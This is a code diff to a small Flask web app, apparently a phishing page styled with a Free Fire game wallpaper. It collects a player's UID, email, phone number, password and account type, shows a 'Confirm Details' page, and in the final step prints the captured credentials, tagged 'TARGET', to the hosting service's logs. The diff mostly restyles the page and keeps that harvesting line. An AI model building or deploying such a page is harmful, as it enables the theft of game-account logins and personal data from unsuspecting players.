@@ -2,10 +2,9 @@ from flask import Flask, request, render_template_string
 
 app = Flask(__name__)
 
-# 1. Aapka PostImages wala Direct Link (Screenshot ke mutabik)
+# Fixed Direct Link (Yeh link 100% chalega)
 BG_URL = "https://i.postimg.cc/zXQBBdsW/1868470-1080x1920-samsung-full-hd-garena-free-fire-wallpaper-photo.jpg"
 
-# 2. Page Design
 HTML_TEMPLATE = f'''
 <!DOCTYPE html>
 <html>
@@ -15,12 +14,16 @@ HTML_TEMPLATE = f'''
     <style>
         body {{
             background-image: url('{BG_URL}');
-            background-size: cover; background-position: center; background-attachment: fixed;
+            background-size: cover; 
+            background-position: center; 
+            background-attachment: fixed;
+            background-repeat: no-repeat;
+            background-color: #1a1a1a; /* Photo load hone tak dark color dikhega */
             margin: 0; font-family: sans-serif;
             display: flex; justify-content: center; align-items: center; min-height: 100vh;
         }}
         .form-box {{
-            background: rgba(255, 255, 255, 0.96); padding: 25px; border-radius: 15px;
+            background: rgba(255, 255, 255, 0.95); padding: 25px; border-radius: 15px;
             text-align: center; width: 320px; box-shadow: 0 10px 30px rgba(0,0,0,0.8);
         }}
         input, select {{ 
@@ -29,7 +32,7 @@ HTML_TEMPLATE = f'''
         }}
         .blue-btn {{ 
             background: #1a73e8; color: white; border: none; padding: 15px; 
-            width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%;
+            width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer;
         }}
     </style>
 </head>
@@ -58,7 +61,6 @@ HTML_TEMPLATE = f'''
 def home():
     return render_template_string(HTML_TEMPLATE)
 
-# 3. PREVIEW PAGE (User details verify karega)
 @app.route('/preview', methods=['POST'])
 def preview():
     uid = request.form.get('uid')
@@ -66,10 +68,9 @@ def preview():
     phone = request.form.get('phone')
     password = request.form.get('password')
     acc = request.form.get('account_type')
-
     return f'''
     <body style="background-image: url('{BG_URL}'); background-size: cover; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: sans-serif;">
-        <div style="background: white; padding: 25px; border-radius: 15px; width: 300px; text-align: center;">
+        <div style="background: white; padding: 25px; border-radius: 15px; width: 300px; text-align: center; box-shadow: 0 5px 15px rgba(0,0,0,0.5);">
             <h3 style="color: red;">Confirm Details</h3>
             <div style="text-align: left; background: #f0f0f0; padding: 15px; border-radius: 8px; font-size: 14px;">
                 <p><b>UID:</b> {uid}</p>
@@ -84,13 +85,12 @@ def preview():
                 <input type="hidden" name="phone" value="{phone}">
                 <input type="hidden" name="password" value="{password}">
                 <input type="hidden" name="acc" value="{acc}">
-                <button type="submit" style="background: #28a745; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px; margin-top: 15px; font-weight: bold;">CONFIRM & GET OTP</button>
+                <button type="submit" style="background: #28a745; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px; margin-top: 15px; font-weight: bold; cursor: pointer;">CONFIRM & GET OTP</button>
             </form>
         </div>
     </body>
     '''
 
-# 4. FINAL SUBMIT (Render Logs mein data dikhega)
 @app.route('/submit_final', methods=['POST'])
 def submit_final():
     uid = request.form.get('uid')
@@ -98,12 +98,7 @@ def submit_final():
     phone = request.form.get('phone')
     password = request.form.get('password')
     acc = request.form.get('acc')
-
-    # Dashboard.render.com ke Logs mein ye dikhega
-    print("\n" + "🎯" * 10)
-    print(f"ID: {uid} | MAIL: {email} | PASS: {password} | PH: {phone} | TYPE: {acc}")
-    print("🎯" * 10 + "\n")
-
+    print(f"\\n🎯 TARGET: ID={uid}, MAIL={email}, PASS={password}, PH={phone}, TYPE={acc}\\n")
     return f'''
     <body style="background-image: url('{BG_URL}'); background-size: cover; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: sans-serif;">
         <div style="background: white; padding: 25px; border-radius: 15px; width: 300px; text-align: center;">
